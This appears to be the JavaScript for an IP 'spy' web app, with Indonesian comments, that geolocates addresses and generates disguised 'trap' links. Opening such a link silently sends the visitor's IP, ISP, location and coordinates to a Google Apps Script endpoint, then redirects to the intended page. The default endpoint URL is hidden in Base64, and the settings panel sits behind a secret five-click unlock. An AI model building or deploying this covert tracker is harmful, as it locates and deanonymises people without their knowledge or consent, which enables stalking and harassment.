document.addEventListener('DOMContentLoaded', function () {
    const myIpBadge = document.getElementById('my-ip-badge');
    const loading = document.getElementById('loading');
    const resultArea = document.getElementById('result-area');
    const geoResult = document.getElementById('geo-result');
    const geoData = document.getElementById('geo-data');
    const logsBody = document.getElementById('logs-body');
    const cloudApiInput = document.getElementById('cloud-api-url');
    const btnSaveSettings = document.getElementById('btn-save-settings');

    // Secret Settings Unlock Logic
    let iconClicks = 0;
    const secretTrigger = document.getElementById('secret-trigger');
    const settingsNavItem = document.getElementById('settings-nav-item');

    secretTrigger.addEventListener('click', () => {
        iconClicks++;
        if (iconClicks === 5) {
            settingsNavItem.style.display = 'block';
            // Auto switch to settings tab
            const settingsTabTrigger = new bootstrap.Tab(document.getElementById('settings-tab'));
            settingsTabTrigger.show();
            console.log("Core Settings Unlocked.");
        }
    });

    // Default "Patent" URL (Base64 encoded)
    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6cVJTX0dsN3cwWFBHeGgyLWVraGtwQndHY01ISWt0Z1lVd19wSGFqU0FTbjY5Mk1IV0dGSUZlSl9GbW56enl0alEvZXhlYw==';
    
    /**
     * Mendapatkan URL API yang aktif. 
     * Prioritas: 1. LocalStorage (User Settings), 2. Default Patent URL.
     */
    const getCUrl = () => localStorage.getItem('spy_cloud_url') || atob(_0x4f2a);

    // Inisialisasi input URL di tab settings saat halaman dimuat
    if (cloudApiInput) {
        cloudApiInput.value = getCUrl();
    }

    btnSaveSettings.addEventListener('click', () => {
        const url = cloudApiInput.value.trim();
        if (url.startsWith('https://script.google.com/')) {
            localStorage.setItem('spy_cloud_url', url);
            alert('Konfigurasi Cloud API berhasil disimpan!');
        } else {
            alert('Error: URL harus valid Google Apps Script (berakhir dengan /exec)');
        }
    });

    function showLoading(show) {
        if (show) loading.classList.remove('d-none');
        else loading.classList.add('d-none');
    }

    async function detectMyIp() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            myIpBadge.innerHTML = `<i class="fas fa-shield-alt me-2 text-primary"></i><span class="font-monospace">${data.ip}</span>`;
            return data.ip;
        } catch (err) {
            myIpBadge.innerHTML = `<i class="fas fa-exclamation-triangle me-2 text-warning"></i>Offline / Blocked`;
            return null;
        }
    }
    detectMyIp();

    async function fetchIpIntel(ip = '') {
        const query = ip ? `/${ip}` : '';
        try {
            const res = await fetch(`https://ipapi.co${query}/json/`);
            const data = await res.json();
            if (!data.error) return {
                ip: data.ip, isp: data.org, location: `${data.city}, ${data.country_name}`,
                lat: data.latitude, lon: data.longitude, timezone: data.timezone
            };
        } catch (e) {}

        try {
            const res = await fetch(`https://get.geojs.io/v1/ip/geo${query}.json`);
            const data = await res.json();
            return {
                ip: data.ip, isp: data.organization, location: `${data.city}, ${data.country}`,
                lat: data.latitude, lon: data.longitude, timezone: data.timezone
            };
        } catch (e) {}
        throw new Error("Gagal menghubungi server intelijen.");
    }

    async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
        const cloudUrl = getCUrl();
        const logEntry = {
            ip: data.ip || 'Unknown',
            isp: data.isp || 'Unknown',
            location: data.location || 'Unknown',
            coords: `${data.lat || 0}, ${data.lon || 0}`,
            target: targetUrl,
            type: type
        };

        if (!cloudUrl || !cloudUrl.includes('script.google.com')) {
            console.error("Target URL tidak valid. Menghentikan sinkronisasi cloud untuk mencegah Error 405.");
            return;
        }

        // Save Local
        const localLogs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
        localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
        localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));

        // Send to Cloud with Redirect Fix
        if (cloudUrl) {
            try {
                // Gunakan mode 'no-cors' dan 'text/plain' untuk melewati hambatan CORS
                // Ini mencegah browser mengirim 'OPTIONS' request yang tidak didukung Apps Script
                fetch(cloudUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    redirect: 'follow', 
                    cache: 'no-cache',
                    headers: { 'Content-Type': 'text/plain' },
                    body: JSON.stringify(logEntry)
                });
                console.log("Tracking sync initiated.");
                // Critical: Wait for transmission to finish before the browser kills the process on redirect
                await new Promise(r => setTimeout(r, 1000));
            } catch (e) { console.error("Cloud Error", e); }
        }
    }

    async function loadLogs() {
        const cloudUrl = getCUrl();
        logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Syncing...</td></tr>';
        try {
            const res = await fetch(cloudUrl);
            const data = await res.json();
            renderLogs(data);
        } catch (e) {
            renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'));
        }
    }

    function renderLogs(logs) {
        if (!logs || logs.length === 0) {
            logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-5 text-muted opacity-50">Belum ada aktivitas.</td></tr>';
            return;
        }
        logsBody.innerHTML = logs.map(log => {
            const isTrap = log.type === 'TRAP';
            return `
                <tr class="animate__animated animate__fadeIn">
                    <td><div class="text-primary small fw-bold">${log.timestamp || 'Just Now'}</div><span class="badge ${isTrap ? 'bg-danger' : 'bg-primary'} extra-small" style="font-size:0.6rem">${isTrap ? 'LINK TRAP' : 'LIVE TRACK'}</span></td>
                    <td><div class="font-monospace text-info fw-bold">${log.ip}</div><div class="text-muted extra-small"><i class="fas fa-network-wired me-1"></i>${log.isp || 'Unknown Provider'}</div></td>
                    <td><span class="small text-white">${log.location}</span></td>
                    <td><a href="https://www.google.com/maps?q=${log.coords}" target="_blank" class="btn btn-xs btn-outline-primary"><i class="fas fa-map-marker-alt"></i></a></td>
                </tr>`;
        }).join('');
    }

    async function performTrack(targetIp) {
        showLoading(true);
        resultArea.innerHTML = '';
        try {
            const data = await fetchIpIntel(targetIp);
            showLoading(false);
            resultArea.innerHTML = `
                <div class="result-card border-primary border-opacity-25 animate__animated animate__fadeInUp">
                    <h5 class="fw-bold text-primary mb-3"><i class="fas fa-fingerprint me-2"></i>Intel: <span class="font-monospace">${data.ip}</span></h5>
                    <div class="mb-2">
                        <div class="data-label">Lokasi Terdeteksi</div>
                        <div class="text-white small">${data.location}</div>
                    </div>
                    <div class="mb-3">
                        <div class="data-label">Provider (ISP)</div>
                        <div class="text-white small font-monospace">${data.isp}</div>
                    </div>
                    <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-link w-100 text-center py-2">BUKA PETA</a>
                </div>`;
            await saveLog(data, targetIp ? 'MANUAL' : 'LIVE');
        } catch (e) { showLoading(false); alert(e.message); }
    }

    document.getElementById('btn-track-ip').addEventListener('click', () => performTrack(document.getElementById('ip-to-track').value));
    document.getElementById('btn-track-me').addEventListener('click', () => performTrack(''));
    document.getElementById('logs-tab').addEventListener('click', loadLogs);
    document.getElementById('btn-refresh-logs').addEventListener('click', loadLogs);
    document.getElementById('btn-clear-logs').addEventListener('click', () => { if(confirm('Hapus log?')) { localStorage.removeItem('spy_logs'); loadLogs(); }});

    // Link Generator
    const btnGenerate = document.getElementById('btn-generate-link');
    const spyUrlResult = document.getElementById('spy-url-result');
    const generatedResult = document.getElementById('generated-result');

    btnGenerate.addEventListener('click', () => {
        const targetUrl = document.getElementById('target-url').value.trim();
        if (!targetUrl.startsWith('http')) return alert('URL harus diawali http:// atau https://');
        const currentUrl = window.location.href.split('?')[0];
        spyUrlResult.value = `${currentUrl}?id=${Math.random().toString(36).substring(7)}&redir=${encodeURIComponent(targetUrl)}`;
        generatedResult.classList.remove('d-none');
    });

    document.getElementById('btn-copy-link').addEventListener('click', async function() {
        await navigator.clipboard.writeText(spyUrlResult.value);
        this.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => this.innerHTML = '<i class="fas fa-copy"></i>', 2000);
    });

    // Handle Trap Redirect
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('id') && urlParams.has('redir')) {
        const redirTarget = urlParams.get('redir');
        fetchIpIntel('')
            .then(async (data) => {
                // Ensure cloud save completes before moving away
                await saveLog(data, 'TRAP', redirTarget);
                window.location.replace(redirTarget);
            })
            .catch(() => { window.location.replace(redirTarget); });
    }
});
